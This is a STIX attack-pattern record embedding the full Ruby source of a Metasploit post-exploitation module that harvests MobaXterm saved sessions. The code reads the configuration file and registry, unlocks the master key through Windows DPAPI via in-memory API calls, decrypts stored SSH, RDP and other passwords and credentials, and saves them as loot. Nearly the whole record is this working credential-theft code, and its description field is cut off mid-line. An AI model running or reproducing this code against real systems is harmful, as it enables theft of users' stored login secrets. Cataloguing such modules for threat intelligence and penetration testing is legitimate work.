{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ce53580d-f8cc-4fa5-a56d-b2f650abe2f3",
    "created": "2024-08-14T16:33:08.234129Z",
    "modified": "2024-08-14T16:33:08.234134Z",
    "name": "Windows Gather MobaXterm Passwords",
    "description": " This module will determine if MobaXterm is installed on the target system and, if it is, it will try to dump all saved session information from the target. The passwords for these saved sessions will then be decrypted where possible, using the decryption information that HyperSine reverse engineered.  'License' => MSF_LICENSE 'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/moba_xterm.rb",
            "external_id": "moba_xterm.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n#\n# @blurbdust based this code off of https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/gpp.rb\n# and https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/enum_ms_product_keys.rb\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::UserProfiles\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather MobaXterm Passwords',\n        'Description' => %q{\n          This module will determine if MobaXterm is installed on the target system and, if it is, it will try to\n          dump all saved session information from the target. The passwords for these saved sessions will then be decrypted\n          where possible, using the decryption information that HyperSine reverse engineered.\n        },\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'URL', 'https://blog.kali-team.cn/Metasploit-MobaXterm-0b976b993c87401598be4caab8cbe0cd' ]\n        ],\n        'Author' => ['Kali-Team <kali-team[at]qq.com>'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Notes' => {\n          'Stability' => [],\n          'Reliability' => [],\n          'SideEffects' => []\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_railgun_api_multi\n              stdapi_railgun_memread\n              stdapi_railgun_memwrite\n              stdapi_sys_process_get_processes\n            ]\n          }\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('MASTER_PASSWORD', [ false, 'If you know the password, you can skip decrypting the master password. If not, it will be decrypted automatically']),\n        OptString.new('CONFIG_PATH', [ false, 'Specifies the config file path for MobaXterm']),\n      ]\n    )\n  end\n\n  def windows_unprotect(entropy, data)\n    begin\n      pid = session.sys.process.getpid\n      process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)\n\n      # write entropy to memory\n      emem = process.memory.allocate(128)\n      process.memory.write(emem, entropy)\n      # write encrypted data to memory\n      mem = process.memory.allocate(128)\n      process.memory.write(mem, data)\n\n      #  enumerate all processes to find the one that we're are currently executing as,\n      #  and then fetch the architecture attribute of that process by doing [\"arch\"]\n      #  to check if it is an 32bits process or not.\n      if session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'\n        addr = [mem].pack('V')\n        len = [data.length].pack('V')\n\n        eaddr = [emem].pack('V')\n        elen = [entropy.length].pack('V')\n\n        ret = session.railgun.crypt32.CryptUnprotectData(\"#{len}#{addr}\", 16, \"#{elen}#{eaddr}\", nil, nil, 0, 8)\n        len, addr = ret['pDataOut'].unpack('V2')\n      else\n        # Convert using rex, basically doing: [mem & 0xffffffff, mem >> 32].pack(\"VV\")\n        addr = Rex::Text.pack_int64le(mem)\n        len = Rex::Text.pack_int64le(data.length)\n\n        eaddr = Rex::Text.pack_int64le(emem)\n        elen = Rex::Text.pack_int64le(entropy.length)\n\n        ret = session.railgun.crypt32.CryptUnprotectData(\"#{len}#{addr}\", 16, \"#{elen}#{eaddr}\", nil, nil, 0, 16)\n        p_data = ret['pDataOut'].unpack('VVVV')\n        len = p_data[0] + (p_data[1] << 32)\n        addr = p_data[2] + (p_data[3] << 32)\n      end\n      return '' if len == 0\n\n      return process.memory.read(addr, len)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      vprint_error(e.message)\n    end\n    return ''\n  end\n\n  def key_crafter(config)\n    if (!config['SessionP'].empty? && !config['SessionP'].nil?)\n      s1 = config['SessionP']\n      s1 += s1 while s1.length < 20\n      key_space = [s1.upcase, s1.upcase, s1.downcase, s1.downcase]\n      key = '0d5e9n1348/U2+67'.bytes\n      for i in (0..key.length - 1)\n        b = key_space[(i + 1) % key_space.length].bytes[i]\n        if !key.include?(b) && '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/'.include?(b)\n          key[i] = b\n        end\n      end\n      return key\n    end\n  end\n\n  def mobaxterm_decrypt(ciphertext, key)\n    ct = ''.bytes\n    ciphertext.each_byte do |c|\n      ct << c if key.include?(c)\n    end\n    if ct.length.even?\n      pt = ''.bytes\n      (0..ct.length - 1).step(2) do |i|\n        l = key.index(ct[i])\n        key = key[0..-2].insert(0, key[-1])\n        h = key.index(ct[i + 1])\n        key = key[0..-2].insert(0, key[-1])\n        next if (l == -1 || h == -1)\n\n        pt << (16 * h + l)\n      end\n      pp pt.pack('c*')\n    end\n  end\n\n  def mobaxterm_crypto_safe(ciphertext, config)\n    return nil if ciphertext.nil? || ciphertext.empty?\n\n    iv = (\"\\x00\" * 16)\n    master_password = datastore['MASTER_PASSWORD'] || ''\n    sesspass = config['Sesspass'][\"#{config['Sesspass']['LastUsername']}@#{config['Sesspass']['LastComputername']}\"]\n    data_ini = Rex::Text.decode_base64('AQAAANCMnd8BFdERjHoAwE/Cl+s=') + Rex::Text.decode_base64(sesspass)\n    key = Rex::Text.decode_base64(windows_unprotect(config['SessionP'], data_ini))[0, 32]\n    # Use the set master password only when using the specified path\n    if !master_password.empty? && datastore['CONFIG_PATH']\n      key = OpenSSL::Digest::SHA512.new(master_password).digest[0, 32]\n    end\n    aes = OpenSSL::Cipher.new('AES-256-ECB').encrypt\n    aes.key = key\n    new_iv = aes.update(iv)\n    # segment_size = 8\n    new_aes = OpenSSL::Cipher.new('AES-256-CFB8').decrypt\n    new_aes.key = key\n    new_aes.iv = new_iv\n    aes.padding = 0\n    padded_plain_bytes = new_aes.update(Rex::Text.decode_base64(ciphertext))\n    padded_plain_bytes << new_aes.final\n    return padded_plain_bytes\n  end\n\n  def gather_password(config)\n    result = []\n    if config['PasswordsInRegistry'] == '1'\n      parent_key = \"#{config['RegistryKey']}\\\\P\"\n      return if !registry_key_exist?(parent_key)\n\n      registry_enumvals(parent_key).each do |connect|\n        username, server_host = connect.split('@')\n        protocol, username = username.split(':') if username.include?(':')\n        password = registry_getvaldata(parent_key, connect)\n        key = key_crafter(config)\n        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password, config)\n        result << {\n          protocol: protocol,\n          server_host: server_host,\n          username: username,\n          password: plaintext\n        }\n      end\n    else\n      config['Passwords'].each_key do |connect|\n        username, server_host = connect.split('@')\n        protocol, username = username.split(':') if username.include?(':')\n        password = config['Passwords'][connect]\n        key = key_crafter(config)\n        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password, config)\n        result << {\n          protocol: protocol,\n          server_host: server_host,\n          username: username,\n          password: plaintext\n        }\n      end\n    end\n    result\n  end\n\n  def gather_creds(config)\n    result = []\n    if config['PasswordsInRegistry'] == '1'\n      parent_key = \"#{config['RegistryKey']}\\\\C\"\n      return if !registry_key_exist?(parent_key)\n\n      registry_enumvals(parent_key).each do |name|\n        username, password = registry_getvaldata(parent_key, name).split(':')\n        key = key_crafter(config)\n        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password, config)\n        result << {\n          name: name,\n          username: username,\n          password: plaintext\n        }\n      end\n    else\n      config['Credentials'].each_key do |name|\n        username, password = config['Credentials'][name].split(':')\n        key = key_crafter(config)\n        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password, config)\n        result << {\n          name: name,\n          username: username,\n          password: plaintext\n        }\n      end\n    end\n\n    result\n  end\n\n  def parser_ini(ini_config_path)\n    valuable_info = {}\n    if session.fs.file.exist?(ini_config_path)\n      file_contents = read_file(ini_config_path)\n      if file_contents.nil? || file_contents.empty?\n        print_warning('Configuration file content is empty')\n        return\n      else\n        config = Rex::Parser::Ini.from_s(file_contents)\n        valuable_info['PasswordsInRegistry'] = config['Misc']['PasswordsInRegistry'] || '0'\n        valuable_info['SessionP'] = config['Misc']['SessionP'] || 0\n        valuable_info['Sesspass'] = config['Sesspass'] || nil\n        valuable_info['Passwords'] = config['Passwords'] || {}\n        valuable_info['Credentials'] = config['Credentials'] || {}\n        valuable_info['Bookmarks'] = config['Bookmarks'] || nil\n        return valuable_info\n      end\n    else\n      print_warning('Could not find the config path for the MobaXterm. Ensure that MobaXterm is installed on the target.')\n      return false\n    end\n  end\n\n  def parse_bookmarks(bookmarks)\n    result = []\n    protocol_hash = { '#109#0' => 'ssh', '#98#1' => 'telnet', '#128#5' => 'vnc', '#140#7' => 'sftp', '#130#6' => 'ftp', '#100#2' => 'rsh', '#91#4' => 'rdp' }\n    bookmarks.each_key do |key|\n      next if key.eql?('ImgNum') || key.eql?('SubRep') || bookmarks[key].empty?\n\n      bookmarks_split = bookmarks[key].strip.split('%')\n      if protocol_hash.include?(bookmarks_split[0])\n        protocol = protocol_hash[bookmarks_split[0]]\n        server_host = bookmarks_split[1]\n        port = bookmarks_split[2]\n        username = bookmarks_split[3]\n        result << { name: key, protocol: protocol, server_host: server_host, port: port, username: username }\n      else\n        print_warning(\"Parsing is not supported: #{bookmarks[key].strip}\")\n      end\n    end\n    return result\n  end\n\n  def entry(config)\n    pws_result = gather_password(config)\n    creds_result = gather_creds(config)\n    bookmarks_result = parse_bookmarks(config['Bookmarks'])\n    return pws_result, creds_result, bookmarks_result\n  end\n\n  def run\n    pw_tbl = Rex::Text::Table.new(\n      'Header' => 'MobaXterm Password',\n      'Columns' => [\n        'Protocol',\n        'Hostname',\n        'Username',\n        'Password',\n      ]\n    )\n    bookmarks_tbl = Rex::Text::Table.new(\n      'Header' => 'MobaXterm Bookmarks',\n      'Columns' => [\n        'BookmarksName',\n        'Protocol',\n        'ServerHost',\n        'Port',\n        'Credentials or Passwords',\n      ]\n    )\n    creds_tbl = Rex::Text::Table.new(\n      'Header' => 'MobaXterm Credentials',\n      'Columns' => [\n        'CredentialsName',\n        'Username',\n        'Password',\n      ]\n    )\n    print_status(\"Gathering MobaXterm session information from #{sysinfo['Computer']}\")\n    ini_config_path = datastore['CONFIG_PATH'] || \"#{registry_getvaldata(\"HKU\\\\#{session.sys.config.getsid}\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell Folders\", 'Personal')}\\\\MobaXterm\\\\MobaXterm.ini\"\n    print_status(\"Specifies the config file path for MobaXterm #{ini_config_path}\")\n    config = parser_ini(ini_config_path)\n    unless config\n      return\n    end\n\n    parent_key = \"HKEY_USERS\\\\#{session.sys.config.getsid}\\\\Software\\\\Mobatek\\\\MobaXterm\"\n    config['RegistryKey'] = parent_key\n    pws_result, creds_result, bookmarks_result = entry(config)\n    pws_result.each do |item|\n      pw_tbl << item.values\n    end\n    bookmarks_result.each do |item|\n      bookmarks_tbl << item.values\n    end\n    creds_result.each do |item|\n      creds_tbl << item.values\n    end\n\n    if pw_tbl.rows.count > 0\n      path = store_loot('host.moba_xterm', 'text/plain', session, pw_tbl, 'moba_xterm.txt', 'MobaXterm Password')\n      print_good(\"Passwords stored in: #{path}\")\n      print_good(pw_tbl.to_s)\n    end\n    if creds_tbl.rows.count > 0\n      path = store_loot('host.moba_xterm', 'text/plain', session, creds_tbl, 'moba_xterm.txt', 'MobaXterm Credentials')\n      print_good(\"Credentials stored in: #{path}\")\n      print_good(creds_tbl.to_s)\n    end\n    if bookmarks_tbl.rows.count > 0\n      path = store_loot('host.moba_xterm', 'text/plain', session, bookmarks_tbl, 'moba_xterm.txt', 'MobaXterm Bookmarks')\n      print_good(\"Bookmarks stored in: #{path}\")\n      print_good(bookmarks_tbl.to_s)\n    end\n    if pw_tbl.rows.count == 0 && creds_tbl.rows.count == 0 && bookmarks_tbl.rows.count == 0\n      print_error(\"I can't find anything!\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[Kali-Team <kali-team[at]qq.com>]",
        ""
    ],
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}